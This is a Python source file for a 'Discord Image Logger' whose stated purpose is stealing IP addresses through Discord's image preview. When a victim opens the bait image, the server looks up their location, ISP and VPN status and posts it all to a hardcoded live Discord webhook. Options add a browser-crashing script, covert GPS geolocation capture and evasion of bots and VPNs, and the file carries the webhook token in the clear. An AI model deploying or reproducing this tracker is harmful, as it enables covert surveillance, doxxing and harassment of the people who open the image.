from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "YoshiDevs"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1094334971155587192/inUax9d-7gYx29RAQXRR9_GCK3R27Yl6TJIFZxv3S3hDIZUqOy_HFQc5Sp8wQRSC2KCN",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL
    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Maloka Logger V2", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "You Are gay?", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "http://canarytokens.com/tags/mep0bfpa9ft13n82865dg0csd/submit.aspx" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
